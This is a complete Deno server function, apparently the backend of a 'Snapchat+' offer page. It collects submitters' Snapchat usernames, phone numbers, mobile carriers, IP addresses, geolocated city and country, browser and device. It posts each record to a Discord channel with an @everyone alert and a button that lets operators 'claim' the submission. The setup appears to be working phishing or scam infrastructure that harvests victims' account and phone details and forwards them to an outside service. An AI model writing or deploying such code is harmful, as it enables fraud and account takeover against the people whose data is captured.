import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const BOT_TOKEN = Deno.env.get("DISCORD_BOT_TOKEN");
const CHANNEL_ID = Deno.env.get("DISCORD_CHANNEL_ID");

Deno.serve(async (req) => {
  try {
    const base44 = createClientFromRequest(req);
    const body = await req.json();
    const { snapchat, telephone, operateur, submissionId, ip, country, city, browser, device } = body;

    const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();

    // Geolocate IP using dedicated function
    let finalCountry = country || "Inconnue";
    let finalCity = city || "Inconnue";
    if (ip && ip !== "Inconnue" && ip !== "unknown") {
      try {
        const geoRes = await base44.functions.invoke("geolocateIP", { ip });
        if (geoRes?.data?.country) {
          finalCountry = geoRes.data.country;
          finalCity = geoRes.data.city || "Inconnue";
        }
      } catch (e) {
        console.error("geolocateIP failed:", e.message);
      }
    }

    const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };
    const now = new Date();
    const dateStr = now.toLocaleDateString("fr-FR", {
      weekday: "long", day: "numeric", month: "long", year: "numeric",
      hour: "2-digit", minute: "2-digit", second: "2-digit",
      timeZone: "Europe/Paris"
    });

    const embed = {
      title: "📱 Nouvelle soumission Snapchat+",
      color: operatorColors[operateur] || 16776960,
      fields: [
        { name: "👤 Utilisateur", value: `@${snapchat}`, inline: true },
        { name: "📡 Opérateur", value: operateur, inline: true },
        { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
        { name: "🌍 Pays", value: finalCountry, inline: true },
        { name: "🏙️ Ville", value: finalCity, inline: true },
        { name: "🌐 Navigateur", value: browser || "Inconnu", inline: true },
        { name: "💾 Appareil", value: device || "Inconnu", inline: true },
        { name: "🕵️ Adresse IP", value: `\`${ip || "Inconnue"}\``, inline: false },
        { name: "🕐 Date de soumission", value: dateStr, inline: false },
      ],
      footer: { text: `ID: ${submissionId || "N/A"}` },
      timestamp: now.toISOString(),
    };

    // Send via bot with a "Claim" button
    const msgRes = await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
      method: "POST",
      headers: {
        "Authorization": `Bot ${BOT_TOKEN}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        content: "@everyone",
        embeds: [embed],
        components: [{
          type: 1,
          components: [{
            type: 2,
            style: 1,
            label: "🎯 Prendre en charge",
            custom_id: `claim_${submissionId}`
          }]
        }]
      })
    });

    if (!msgRes.ok) {
      const err = await msgRes.text();
      console.error("Discord bot error:", err);
      return Response.json({ ok: false, error: err }, { status: 500 });
    }

    await base44.asServiceRole.entities.ActionLog.create({
      submission_id: submissionId,
      action: "submitted",
      details: { browser: browser || "Inconnu", device: device || "Inconnu", ip: ip || "Inconnue", country: finalCountry, city: finalCity },
      timestamp: now.toISOString()
    });

    return Response.json({ ok: true });
  } catch (error) {
    console.error("Error:", error.message);
    return Response.json({ error: error.message }, { status: 500 });
  }
});